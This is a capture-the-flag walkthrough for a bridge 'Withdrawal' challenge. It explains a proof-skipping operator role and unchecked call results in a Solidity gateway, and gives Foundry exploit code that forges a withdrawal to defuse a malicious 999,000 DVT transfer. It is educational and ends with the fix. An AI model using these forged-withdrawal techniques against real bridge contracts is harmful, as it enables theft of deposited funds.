## Challenge 18 Walkthrough: Withdrawal

### Vulnerability

Two design choices combine into the bug.

#### Primary: operators finalize without a proof

`L1Gateway.finalizeWithdrawal` lets anyone with `OPERATOR_ROLE` skip Merkle verification entirely:

```solidity
function finalizeWithdrawal(
    uint256 nonce, address l2Sender, address target, uint256 timestamp,
    bytes memory message, bytes32[] memory proof
) external {
    if (timestamp + DELAY > block.timestamp) revert EarlyWithdrawal();
    bytes32 leaf = keccak256(abi.encode(nonce, l2Sender, target, timestamp, message));

    bool isOperator = hasAnyRole(msg.sender, OPERATOR_ROLE);
    if (!isOperator) {
        if (MerkleProof.verify(proof, root, leaf)) { ... } else { revert InvalidProof(); }
    }                                          // ← operators bypass this whole branch

    if (finalizedWithdrawals[leaf]) revert AlreadyFinalized(leaf);
    finalizedWithdrawals[leaf] = true;
    counter++;
    ...
    assembly { success := call(gas(), target, 0, add(message, 0x20), mload(message), 0, 0) }
    ...   // ← leaf is finalized regardless of whether this inner call succeeds
}
```

The player is granted `OPERATOR_ROLE` in setup, so they can finalize any `(nonce, l2Sender, target, timestamp, message)` tuple — including one of their own invention.

#### Secondary: finalize marks the leaf even if the inner call reverts

The gateway records `finalizedWithdrawals[leaf] = true` and bumps `counter` *before* the low-level `call`, and never checks its `success`. The set of withdrawals to finalize contains a forged leaf (`#2`) requesting **999,000 DVT** — finalizing it normally would drain the bridge. But because finalization succeeds even when the inner transfer reverts, the malicious leaf can be marked processed while moving zero tokens.

The downstream bridge underflows on an over-large withdrawal:

```solidity
function executeTokenWithdrawal(address receiver, uint256 amount) external {
    if (msg.sender != address(l1Forwarder) || l1Forwarder.getSender() == otherBridge) revert Unauthorized();
    totalDeposits -= amount;   // ← reverts if amount > totalDeposits
    token.transfer(receiver, amount);
}
```

### Exploit

The four real leaves were generated against deterministic addresses that match the live deployment (`L1Forwarder = 0xfF2Bd…`, `TokenBridge = 0x9c52…`), so finalizing them with their original params routes correctly. There is no player-nonce constraint, so the calls are made inline.

**Step 1 — Warp past the delay.** A cheatcode, not a transaction.

```solidity
vm.warp(START_TIMESTAMP + 8 days);
```

**Step 2 — Lower `totalDeposits` below the malicious amount, without losing balance.** Finalize a *crafted* withdrawal whose inner call is `executeTokenWithdrawal(l1TokenBridge, 1_100e18)`. Sending to the bridge itself is a self-transfer (token balance unchanged), but `totalDeposits` drops to `998,900e18`.

```solidity
bytes memory reducerInner =
    abi.encodeWithSignature("executeTokenWithdrawal(address,uint256)", address(l1TokenBridge), uint256(1_100e18));
bytes memory reducerFwd = abi.encodeWithSignature(
    "forwardMessage(uint256,address,address,bytes)",
    uint256(1000), address(l2Handler), address(l1TokenBridge), reducerInner
);
l1Gateway.finalizeWithdrawal(1000, address(l2Handler), address(l1Forwarder), START_TIMESTAMP, reducerFwd, new bytes32[](0));
```

**Step 3 — Finalize the four real leaves with their exact original params.**

```solidity
for (uint256 i = 0; i < 4; i++) {
    l1Gateway.finalizeWithdrawal(i, address(l2Handler), address(l1Forwarder), tss[i], msgs[i], new bytes32[](0));
}
```

- Leaves `#0/#1/#3` each move a legitimate 10 DVT (30 total — well under 1%).
- Leaf `#2`'s inner `executeTokenWithdrawal(_, 999_000e18)` underflows `998,900 - 999,000` and reverts inside the forwarder. The forwarder records a failed message; the gateway still finalizes the leaf and bumps `counter`. **Zero tokens drained.**

### 🎯 Result: All `_isSolved()` Checks Pass

| Check | Passed Because |
|-------|----------------|
| Bridge balance `< 100%` | 30 DVT left via the three legit withdrawals |
| Bridge balance `> 99%` | Final balance ≈ 999,970 DVT (only 30 moved; reducer self-transferred) |
| `player` holds 0 tokens | Player never receives tokens |
| `counter >= 4` | Five `finalizeWithdrawal` calls (reducer + four leaves) |
| All four required leaves finalized | Each finalized with its exact original params |

### Why It Works

The operator role turns finalization into an unauthenticated primitive — any tuple can be "finalized" — and the gateway treats a leaf as processed the instant it is recorded, independent of whether the funds actually move. That lets the player satisfy the "every withdrawal, including the suspicious one, must be finalized" requirement while neutralizing the forged 999,000 DVT transfer: pre-shrink `totalDeposits` so the malicious leaf's inner call reverts on underflow, leaving it finalized-but-harmless.

The fix is to require a valid Merkle proof for *all* callers (operators included), and to only mark a withdrawal finalized when its execution actually succeeds.

This is an **operator finalize-without-proof flaw plus finalize-ignores-call-result** — all four withdrawals are marked processed while the malicious 999,000 DVT transfer is defused, keeping the bridge above 99%.
